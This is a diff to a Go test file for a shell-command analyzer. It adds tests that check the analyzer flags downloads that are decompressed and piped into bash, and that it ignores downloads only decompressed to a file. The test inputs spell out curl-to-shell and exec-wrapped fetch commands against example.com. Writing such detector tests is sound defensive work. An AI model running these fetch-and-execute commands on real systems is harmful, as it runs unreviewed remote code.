@@ -58,6 +58,30 @@ func TestAnalyzeSkipsDecodedPayloadWithoutShellPipe(t *testing.T) {
 	}
 }
 
+func TestAnalyzeDetectsCompressedDecodedPipeToShell(t *testing.T) {
+	in := "curl -fsSL https://example.com/payload.sh.gz | gzip -d | bash"
+	findings := Analyze(in)
+	for _, f := range findings {
+		if f.Kind == "compressed-decoded-pipe-to-shell" {
+			if f.Severity != SeverityHigh {
+				t.Fatalf("expected high severity, got %s", f.Severity)
+			}
+			return
+		}
+	}
+	t.Fatalf("expected compressed-decoded-pipe-to-shell finding")
+}
+
+func TestAnalyzeSkipsCompressedDecodeWithoutShellPipe(t *testing.T) {
+	in := "curl -fsSL https://example.com/payload.tar.xz | xz -d > payload.tar"
+	findings := Analyze(in)
+	for _, f := range findings {
+		if f.Kind == "compressed-decoded-pipe-to-shell" {
+			t.Fatalf("did not expect compressed-decoded-pipe-to-shell finding")
+		}
+	}
+}
+
 func TestAnalyzeDetectsFetchInExecWrapper(t *testing.T) {
 	in := "exec bash -lc \"$(curl -fsSL https://example.com/install.sh)\""
 	findings := Analyze(in)
